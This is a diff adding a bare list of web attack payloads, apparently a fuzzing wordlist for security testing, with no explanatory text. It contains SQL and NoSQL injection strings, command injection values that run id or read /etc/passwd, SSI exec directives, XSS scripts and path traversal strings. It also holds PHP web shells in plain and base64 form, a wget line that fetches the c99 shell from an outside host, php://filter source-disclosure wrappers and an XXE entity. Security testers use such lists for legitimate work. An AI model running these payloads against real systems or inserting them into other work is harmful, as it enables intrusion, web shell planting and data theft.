@@ -1,0 +1,134 @@
+!
+!'
+"
+#
+#'
+$
+%
+%00/
+%2e
+%2e0
+%70
+'
+(
+('
+)
+)'
+*
+-
+[
+]
+_
+.
+.%E2%73%70
+/
+/*
+</foo>
+<<
+?*
+?x=
+?x="
+?x=>
+?x=|
+\
+null
+{}
+{"1":"0"}
+{"1":0}
+{"id":1}
+{"id":"1"}
+{{}}
+{{$}}
+{{$.Requests}}
+{{nil}}
+{{.Requests}}
+$NULL
+$null
+127.0.0.1
+::1
+localhost
+%20
+%00
+%2f
+%5c
+..%255c
+.%5c../..%5c
+/..%c0%9v../
+/..%c0%af../
+/..%255c..%255c
+version()
+user()
+@@hostname
+@@basedir
+@@datadir
+database()
+' or '1'='1
+' or 2=2
+' or ''='
+' UNION ALL SELECT
+' UNION SELECT
+' or ''='
+' or '1'='1
+' or '1'='1'--
+1 or 1 in (@@version)--
+ union select 
+ union select 1 from random.randomtable
+true, $where: '1 == 1'
+, $where: '1 == 1'
+|| 1==1
+{ $ne: 1 }
+{$gt: ''}
+[$ne]=1
+%0A/usr/bin/id
+;system('id')
+;system('cat%20/etc/passwd')
+%0Aid
+& id
+;id
+;id;
+;id|
+;netstat -a;
+<!--#exec cmd="/bin/ls /" --><br/>
+`id`
+|/usr/bin/id
+|/usr/bin/id|
+|id
+|id;
+|id|
+||/usr/bin/id;
+||/usr/bin/id|
+<!--#exec cmd="cat /etc/passwd" --><br/>
+<!--#exec cmd="/usr/bin/id"-->
+<!--#exec cmd="id"-->
+");alert('xss');
+";eval(unescape(location))//#  %0Aalert(0)
+"><script>"
+"><script>alert(1)</script>
+' onmouseover=alert(1)
+'); alert('XSS
+')alert('xss');
+<IMG onmouseover="alert('xxs')">
+<font style='color:expression(alert('XSS'))'>
+<script>alert('TheZakMan')</script>
+/etc/passwd
+%00../../../../../../etc/passwd
+../../../../../../../../../../../../etc/hosts
+../../../../../../../../../../../../etc/passwd
+<? system($_GET['c']); ?>
+<?php phpinfo(); ?>
+<?system('id');?>
+<?system('uname -a');?>
+<?system('wget http://www.sh3ll.org/c99.txt -O shell.php');?>
+PD8gc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
+data:;base64,PD8gZXhlYygkX0dFVFtjbWRdKTsgPz4=&cmd=whoami
+php://filter/convert.base64-encode/resource=index
+php://filter/convert.base64-encode/resource=index.php
+php://filter/resource=http://127.0.0.1
+php://filter/resource=http://www.google.com
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////dev/random"">]><foo>&xxe;</foo>"
+/admin
+/cache
+/files
+/images
+/temp
+/temporary
